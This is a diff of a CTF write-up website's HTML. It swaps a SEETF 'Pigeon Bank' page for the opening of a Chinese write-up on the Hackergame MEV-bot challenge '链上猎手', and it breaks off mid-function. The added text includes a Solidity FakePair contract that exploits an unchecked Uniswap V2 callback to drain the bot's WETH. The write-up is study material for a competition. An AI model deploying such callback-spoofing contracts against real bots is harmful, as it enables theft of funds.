@@ -6,20 +6,20 @@
       <meta charset="utf-8">
       <meta name="viewport" content="width=device-width,initial-scale=1">
       
-        <meta name="description" content="2023 | SEETF | Smart Contracts">
+        <meta name="description" content="2023 | 中国科学技术大学第十届信息安全大赛 | general">
       
       
         <meta name="author" content="YanhuiJessica">
       
       
-        <link rel="canonical" href="https://yanhuijessica.github.io/Chictf-Writeups/blockchain/pigeon_bank/">
+        <link rel="canonical" href="https://yanhuijessica.github.io/Chictf-Writeups/blockchain/chain_hunter/">
       
       <link rel="icon" href="../../assets/images/favicon.png">
       <meta name="generator" content="mkdocs-1.6.0, mkdocs-material-8.3.3">
     
     
       
-        <title>Blockchain - Pigeon Bank - Chictf-Writeups</title>
+        <title>Blockchain - 链上猎手 - Chictf-Writeups</title>
       
     
     
@@ -113,7 +113,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Blockchain - Pigeon Bank
+              Blockchain - 链上猎手
             
           </span>
         </div>
@@ -2428,14 +2428,12 @@
               
   
   
-    
-  
   
     
-    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--nested">
       
       
-        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_7_14" type="checkbox" id="__nav_7_14" checked>
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_7_14" type="checkbox" id="__nav_7_14" >
       
       
       
@@ -2484,75 +2482,11 @@
               
   
   
-    
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
-      
-      
-      
-        <label class="md-nav__link md-nav__link--active" for="__toc">
-          Pigeon Bank
-          <span class="md-nav__icon md-icon"></span>
-        </label>
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="../pigeon_bank/" class="md-nav__link">
         Pigeon Bank
       </a>
-      
-        
-
-<nav class="md-nav md-nav--secondary" aria-label="目录">
-  
-  
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      目录
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#_1" class="md-nav__link">
-    题目
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#_2" class="md-nav__link">
-    解题思路
-  </a>
-  
-    <nav class="md-nav" aria-label="解题思路">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#exploit" class="md-nav__link">
-    Exploit
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#flag" class="md-nav__link">
-    Flag
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-      
     </li>
   
 
@@ -2686,11 +2620,169 @@
               
   
   
+    
   
-    <li class="md-nav__item">
-      <a href="../chain_hunter/" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          链上猎手
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
         链上猎手
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    题目
+  </a>
+  
+    <nav class="md-nav" aria-label="题目">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#the-maximal-extractable-value" class="md-nav__link">
+    The Maximal Extractable Value
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#the-dark-forest" class="md-nav__link">
+    The Dark Forest
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#deaths-end" class="md-nav__link">
+    Death's End
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    解题思路
+  </a>
+  
+    <nav class="md-nav" aria-label="解题思路">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#the-maximal-extractable-value_1" class="md-nav__link">
+    The Maximal Extractable Value
+  </a>
+  
+    <nav class="md-nav" aria-label="The Maximal Extractable Value">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exploitation" class="md-nav__link">
+    Exploitation
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#flag" class="md-nav__link">
+    Flag
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#the-dark-forest_1" class="md-nav__link">
+    The Dark Forest
+  </a>
+  
+    <nav class="md-nav" aria-label="The Dark Forest">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exploitation_1" class="md-nav__link">
+    Exploitation
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#flag_1" class="md-nav__link">
+    Flag
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#deaths-end_1" class="md-nav__link">
+    Death's End
+  </a>
+  
+    <nav class="md-nav" aria-label="Death's End">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exploitation_2" class="md-nav__link">
+    Exploitation
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#flag_2" class="md-nav__link">
+    Flag
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
     </li>
   
 
@@ -3745,6 +3837,33 @@
     题目
   </a>
   
+    <nav class="md-nav" aria-label="题目">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#the-maximal-extractable-value" class="md-nav__link">
+    The Maximal Extractable Value
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#the-dark-forest" class="md-nav__link">
+    The Dark Forest
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#deaths-end" class="md-nav__link">
+    Death's End
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
 </li>
       
         <li class="md-nav__item">
@@ -3756,8 +3875,16 @@
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#exploit" class="md-nav__link">
-    Exploit
+  <a href="#the-maximal-extractable-value_1" class="md-nav__link">
+    The Maximal Extractable Value
+  </a>
+  
+    <nav class="md-nav" aria-label="The Maximal Extractable Value">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exploitation" class="md-nav__link">
+    Exploitation
   </a>
   
 </li>
@@ -3766,6 +3893,65 @@
   <a href="#flag" class="md-nav__link">
     Flag
   </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#the-dark-forest_1" class="md-nav__link">
+    The Dark Forest
+  </a>
+  
+    <nav class="md-nav" aria-label="The Dark Forest">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exploitation_1" class="md-nav__link">
+    Exploitation
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#flag_1" class="md-nav__link">
+    Flag
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#deaths-end_1" class="md-nav__link">
+    Death's End
+  </a>
+  
+    <nav class="md-nav" aria-label="Death's End">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exploitation_2" class="md-nav__link">
+    Exploitation
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#flag_2" class="md-nav__link">
+    Flag
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
   
 </li>
         
@@ -3788,27 +3974,27 @@
   
   <div style="color: gray;">
     <small>
-      2023 | SEETF | Smart Contracts
+      2023 | 中国科学技术大学第十届信息安全大赛 | general
     </small>
   </div>
   
 
   
                 
-  <a href="https://github.com/YanhuiJessica/Chictf-Writeups/edit/master/docs/blockchain/pigeon_bank.md" title="编辑此页" class="md-content__button md-icon">
+  <a href="https://github.com/YanhuiJessica/Chictf-Writeups/edit/master/docs/blockchain/chain_hunter.md" title="编辑此页" class="md-content__button md-icon">
     <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25Z"/></svg>
   </a>
 
 
 
-  <h1>Pigeon Bank</h1>
+  <h1>链上猎手</h1>
 
 <div class="md-typeset">
     <div class="blogging-tags-grid">
 
-        <a href="#smart contract" class="blogging-tag"><code>#smart contract</code></a>
+        <a href="#mev" class="blogging-tag"><code>#mev</code></a>
 
-        <a href="#cross-function reentrancy" class="blogging-tag"><code>#cross-function reentrancy</code></a>
+        <a href="#uniswap v2" class="blogging-tag"><code>#uniswap v2</code></a>
 
     </div>
 
@@ -3836,151 +4022,139 @@
     }
 </style>
 <h2 id="_1">题目<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
-<p>The new era is coming. Pigeons are invading and in order to survive, the SEE Team created PigeonBank so that people can get extremely high interest rate. Hold PETH to get high interest. PETH is strictly controlled by the SEE team to prevent manipulation and corruption.</p>
+<p>你最近研究了一下如何在区块链上开发一个 MEV Bot，而小 Z 跟你说：「区块链就像是一个黑暗森林，到处都是带枪的猎人。」</p>
+<p><a href="../static/chain_hunter.zip"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 20h14v-2H5m14-9h-4V3H9v6H5l7 7 7-7Z"/></svg></span> <code>chain_hunter.zip</code></a></p>
+<p>注：题目环境未启用 EVM 的 Shanghai 升级，不支持 PUSH0 指令，与 Solidity 0.8.20 及以上版本的默认编译选项不兼容，请注意选择正确的 EVM 版本。</p>
+<h3 id="the-maximal-extractable-value">The Maximal Extractable Value<a class="headerlink" href="#the-maximal-extractable-value" title="Permanent link">&para;</a></h3>
+<p>「我新写的 MEV Bot，是不是很安全？」</p>
+<h3 id="the-dark-forest">The Dark Forest<a class="headerlink" href="#the-dark-forest" title="Permanent link">&para;</a></h3>
+<p>「Gas fee 好贵！听别人说节约 gas 的一个好方法就是把能在链下检查的逻辑都从智能合约挪到链下去检查。」</p>
+<h3 id="deaths-end">Death's End<a class="headerlink" href="#deaths-end" title="Permanent link">&para;</a></h3>
+<p>「每次更新代码都重新部署智能合约也太贵了，我这次一定要写一个通用的 MEV Bot 合约！」</p>
+<h2 id="_2">解题思路<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<ul>
+<li>初始共有两个 <code>UniswapV2Pair</code>，<code>WETH</code> 和 <code>Token</code> 的比例分别为 1:1 和 1:2</li>
+<li>
+<p>每小题对应不同的 MEV bot，将在每个区块采用不同的方式在两个 pair 间按照特定路径套利</p>
+<div class="highlight"><pre><span></span><code><span class="k">for</span> <span class="n">token</span><span class="p">,</span> <span class="n">pairs</span> <span class="ow">in</span> <span class="n">token_to_pairs</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">pairs</span><span class="p">)</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>
+        <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Processing WETH -&gt; </span><span class="si">{</span><span class="n">token</span><span class="si">}</span><span class="s1"> -&gt; WETH, pairs=</span><span class="si">{</span><span class="n">pairs</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">process_pairs</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="o">*</span><span class="n">pairs</span><span class="p">)</span>
+</code></pre></div>
+</li>
+<li>
+<p>MEV bot 初始持有 1 WETH，目标是使其余额为 0</p>
+</li>
+</ul>
+<h3 id="the-maximal-extractable-value_1">The Maximal Extractable Value<a class="headerlink" href="#the-maximal-extractable-value_1" title="Permanent link">&para;</a></h3>
+<p>由于只检查了 <code>IUniswapV2Pair(msg.sender).factory()</code> 的返回值是否为 <code>FACTORY1</code> 或 <code>FACTORY2</code>，因此可以创建一个假 pair 来转出 MEV bot 中的 WETH。</p>
+<div class="highlight"><pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">uniswapV2Call</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">uint</span><span class="p">,</span><span class="w"> </span><span class="nx">uint</span><span class="p">,</span><span class="w"> </span><span class="nx">bytes</span><span class="w"> </span><span class="nx">calldata</span><span class="w"> </span><span class="nx">data</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">require</span><span class="p">(</span><span class="nx">IUniswapV2Pair</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">).</span><span class="nx">factory</span><span class="p">()</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">FACTORY1</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="nx">IUniswapV2Pair</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">).</span><span class="nx">factory</span><span class="p">()</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">FACTORY2</span><span class="p">);</span>
+<span class="w">    </span><span class="nx">require</span><span class="p">(</span><span class="nx">sender</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">));</span>
+<span class="w">    </span><span class="p">(</span><span class="nx">IUniswapV2Pair</span><span class="w"> </span><span class="nx">pair1</span><span class="p">,</span><span class="w"> </span><span class="nx">IUniswapV2Pair</span><span class="w"> </span><span class="nx">pair2</span><span class="p">,</span><span class="w"> </span><span class="nx">uint</span><span class="w"> </span><span class="nx">amount1</span><span class="p">,</span><span class="w"> </span><span class="nx">uint</span><span class="w"> </span><span class="nx">amount2</span><span class="p">,</span><span class="w"> </span><span class="nx">bool</span><span class="w"> </span><span class="nx">dir</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">abi</span><span class="p">.</span><span class="nx">decode</span><span class="p">(</span><span class="nx">data</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="nx">IUniswapV2Pair</span><span class="p">,</span><span class="w"> </span><span class="nx">IUniswapV2Pair</span><span class="p">,</span><span class="w"> </span><span class="nx">uint</span><span class="p">,</span><span class="w"> </span><span class="nx">uint</span><span class="p">,</span><span class="w"> </span><span class="nx">bool</span><span class="p">));</span>
+<span class="w">    </span><span class="nx">require</span><span class="p">(</span><span class="nx">WETH</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">pair1</span><span class="p">),</span><span class="w"> </span><span class="nx">amount1</span><span class="p">));</span>
+<span class="w">    </span><span class="nx">pair1</span><span class="p">.</span><span class="nx">swap</span><span class="p">(</span><span class="nx">dir</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="nx">amount2</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="nx">dir</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="mf">0</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="nx">amount2</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="nx">pair2</span><span class="p">),</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div>
+<h4 id="exploitation">Exploitation<a class="headerlink" href="#exploitation" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code><span class="nx">contract</span><span class="w"> </span><span class="nx">FakePair</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">factory</span><span class="p">;</span>
+
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">exploit</span><span class="p">(</span><span class="nx">IUniswapV2Callee</span><span class="w"> </span><span class="nx">_bot</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">_factory</span><span class="p">,</span><span class="w"> </span><span class="nx">IWETH</span><span class="w"> </span><span class="nx">weth</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">factory</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_factory</span><span class="p">;</span>
+<span class="w">        </span><span class="nx">address</span><span class="w"> </span><span class="nx">bot</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="nx">_bot</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">bytes</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">abi</span><span class="p">.</span><span class="nx">encode</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">),</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">),</span><span class="w"> </span><span class="nx">weth</span><span class="p">.</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">bot</span><span class="p">),</span><span class="w"> </span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="kc">true</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">_bot</span><span class="p">.</span><span class="nx">uniswapV2Call</span><span class="p">(</span><span class="nx">bot</span><span class="p">,</span><span class="w"> </span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="nx">data</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="c1">// let `pair1.swap()` call not revert</span>
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">swap</span><span class="p">(</span><span class="nx">uint</span><span class="p">,</span><span class="w"> </span><span class="nx">uint</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="p">,</span><span class="w"> </span><span class="nx">bytes</span><span class="w"> </span><span class="nx">calldata</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="p">{}</span>
+<span class="p">}</span>
+</code></pre></div>
+<h4 id="flag">Flag<a class="headerlink" href="#flag" title="Permanent link">&para;</a></h4>
 <blockquote>
-<p>nc win.the.seetf.sg 8550</p>
+<p>flag{ch3ck_Y0ur_c4llb4ck!!8e0af8a0d1}</p>
 </blockquote>
-<details class="note">
-<summary>Setup.sol</summary>
-<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: UNLICENSED</span>
-<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.17</span><span class="p">;</span>
+<h3 id="the-dark-forest_1">The Dark Forest<a class="headerlink" href="#the-dark-forest_1" title="Permanent link">&para;</a></h3>
+<ul>
+<li>
+<p>MEV bot 在模拟执行成功后才会发起链上套利交易</p>
+<div class="highlight"><pre><span></span><code><span class="n">bot</span><span class="o">.</span><span class="n">functions</span><span class="o">.</span><span class="n">simulate</span><span class="p">(</span><span class="n">pair1_address</span><span class="p">,</span> <span class="n">pair2_address</span><span class="p">,</span> <span class="n">amount1</span><span class="p">,</span> <span class="n">amount2</span><span class="p">,</span> <span class="n">amount3</span><span class="p">,</span> <span class="n">direction</span><span class="p">)</span><span class="o">.</span><span class="n">call</span><span class="p">(</span>
+    <span class="p">{</span><span class="s1">&#39;nonce&#39;</span><span class="p">:</span> <span class="n">nonce</span><span class="p">,</span> <span class="s1">&#39;from&#39;</span><span class="p">:</span> <span class="n">acct</span><span class="o">.</span><span class="n">address</span><span class="p">,</span> <span class="s1">&#39;gas&#39;</span><span class="p">:</span> <span class="mi">10</span> <span class="o">**</span> <span class="mi">6</span><span class="p">,</span> <span class="s1">&#39;gasPrice&#39;</span><span class="p">:</span> <span class="mi">10</span> <span class="o">**</span> <span class="mi">11</span><span class="p">}</span>
+<span class="p">)</span>
+<span class="n">tx</span> <span class="o">=</span> <span class="n">bot</span><span class="o">.</span><span class="n">functions</span><span class="o">.</span><span class="n">arbitrage</span><span class="p">(</span><span class="n">pair1_address</span><span class="p">,</span> <span class="n">pair2_address</span><span class="p">,</span> <span class="n">amount1</span><span class="p">,</span> <span class="n">amount2</span><span class="p">,</span> <span class="n">amount3</span><span class="p">,</span> <span class="n">direction</span><span class="p">)</span><span class="o">.</span><span class="n">build_transaction</span><span class="p">(</span>
+    <span class="p">{</span><span class="s1">&#39;nonce&#39;</span><span class="p">:</span> <span class="n">nonce</span><span class="p">,</span> <span class="s1">&#39;from&#39;</span><span class="p">:</span> <span class="n">acct</span><span class="o">.</span><span class="n">address</span><span class="p">,</span> <span class="s1">&#39;gas&#39;</span><span class="p">:</span> <span class="mi">10</span> <span class="o">**</span> <span class="mi">6</span><span class="p">,</span> <span class="s1">&#39;gasPrice&#39;</span><span class="p">:</span> <span class="mi">10</span> <span class="o">**</span> <span class="mi">11</span><span class="p">}</span>
+<span class="p">)</span>
+</code></pre></div>
+</li>
+<li>
+<p><code>arbitrage()</code> 和 <code>simulate()</code> 所执行的操作完全一致，即先从 <code>pair2</code> 中换出 <code>WETH</code>，再在回调中使用一部分 <code>WETH</code> 换取中间代币以完成 <code>pair2.swap()</code>。但 <code>arbitrage()</code> 缺少保证交易获利的 <code>require</code> 语句</p>
+<div class="highlight"><pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">arbitrage</span><span class="p">(</span><span class="nx">IUniswapV2Pair</span><span class="w"> </span><span class="nx">pair1</span><span class="p">,</span><span class="w"> </span><span class="nx">IUniswapV2Pair</span><span class="w"> </span><span class="nx">pair2</span><span class="p">,</span><span class="w"> </span><span class="nx">uint</span><span class="w"> </span><span class="nx">amount1</span><span class="p">,</span><span class="w"> </span><span class="nx">uint</span><span class="w"> </span><span class="nx">amount2</span><span class="p">,</span><span class="w"> </span><span class="nx">uint</span><span class="w"> </span><span class="nx">amount3</span><span class="p">,</span><span class="w"> </span><span class="nx">bool</span><span class="w"> </span><span class="nx">dir</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">owner</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;sender&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="nx">pair2</span><span class="p">.</span><span class="nx">swap</span><span class="p">(</span><span class="nx">dir</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="mf">0</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="nx">amount3</span><span class="p">,</span><span class="w"> </span><span class="nx">dir</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="nx">amount3</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">),</span><span class="w"> </span><span class="nx">abi</span><span class="p">.</span><span class="nx">encode</span><span class="p">(</span><span class="nx">pair1</span><span class="p">,</span><span class="w"> </span><span class="nx">pair2</span><span class="p">,</span><span class="w"> </span><span class="nx">amount1</span><span class="p">,</span><span class="w"> </span><span class="nx">amount2</span><span class="p">,</span><span class="w"> </span><span class="nx">dir</span><span class="p">));</span>
+<span class="p">}</span>
 
-<span class="k">import</span><span class="w"> </span><span class="s2">&quot;./PETH.sol&quot;</span><span class="p">;</span>
-<span class="k">import</span><span class="w"> </span><span class="s2">&quot;./PigeonBank.sol&quot;</span><span class="p">;</span>
-
-<span class="nx">contract</span><span class="w"> </span><span class="nx">Setup</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="nx">PETH</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">immutable</span><span class="w"> </span><span class="nx">peth</span><span class="p">;</span>
-<span class="w">    </span><span class="nx">PigeonBank</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">immutable</span><span class="w"> </span><span class="nx">pigeonBank</span><span class="p">;</span>
-
-<span class="w">    </span><span class="c1">// @dev - The SEE Team provided 2500 ETH to PigeonBank to provide liquidity so that the bank stays solvent.</span>
-<span class="w">    </span><span class="kr">constructor</span><span class="p">()</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="p">{</span>
-<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mf">2500</span><span class="w"> </span><span class="nx">ether</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;Setup: msg.value must be 2500 ether&quot;</span><span class="p">);</span>
-<span class="w">        </span><span class="nx">pigeonBank</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">PigeonBank</span><span class="p">();</span>
-<span class="w">        </span><span class="nx">peth</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">pigeonBank</span><span class="p">.</span><span class="nx">peth</span><span class="p">();</span>
-
-<span class="w">        </span><span class="c1">// @dev - Deposit 2500 ETH to PigeonBank</span>
-<span class="w">        </span><span class="nx">pigeonBank</span><span class="p">.</span><span class="nx">deposit</span><span class="p">{</span><span class="nx">value</span><span class="o">:</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">}();</span>
-
-<span class="w">        </span><span class="nx">assert</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">pigeonBank</span><span class="p">).</span><span class="nx">balance</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mf">0</span><span class="w"> </span><span class="nx">ether</span><span class="p">);</span>
-<span class="w">        </span><span class="nx">assert</span><span class="p">(</span><span class="nx">peth</span><span class="p">.</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">))</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mf">2500</span><span class="w"> </span><span class="nx">ether</span><span class="p">);</span>
-<span class="w">    </span><span class="p">}</span>
-
-<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">isSolved</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">bool</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
-<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="p">(</span><span class="nx">peth</span><span class="p">.</span><span class="nx">totalSupply</span><span class="p">()</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">).</span><span class="nx">balance</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mf">2500</span><span class="w"> </span><span class="nx">ether</span><span class="p">);</span>
-<span class="w">    </span><span class="p">}</span>
+<span class="kd">function</span><span class="w"> </span><span class="nx">simulate</span><span class="p">(</span><span class="nx">IUniswapV2Pair</span><span class="w"> </span><span class="nx">pair1</span><span class="p">,</span><span class="w"> </span><span class="nx">IUniswapV2Pair</span><span class="w"> </span><span class="nx">pair2</span><span class="p">,</span><span class="w"> </span><span class="nx">uint</span><span class="w"> </span><span class="nx">amount1</span><span class="p">,</span><span class="w"> </span><span class="nx">uint</span><span class="w"> </span><span class="nx">amount2</span><span class="p">,</span><span class="w"> </span><span class="nx">uint</span><span class="w"> </span><span class="nx">amount3</span><span class="p">,</span><span class="w"> </span><span class="nx">bool</span><span class="w"> </span><span class="nx">dir</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">owner</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;sender&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="nx">uint</span><span class="w"> </span><span class="nx">balanceBefore</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">WETH</span><span class="p">.</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">));</span>
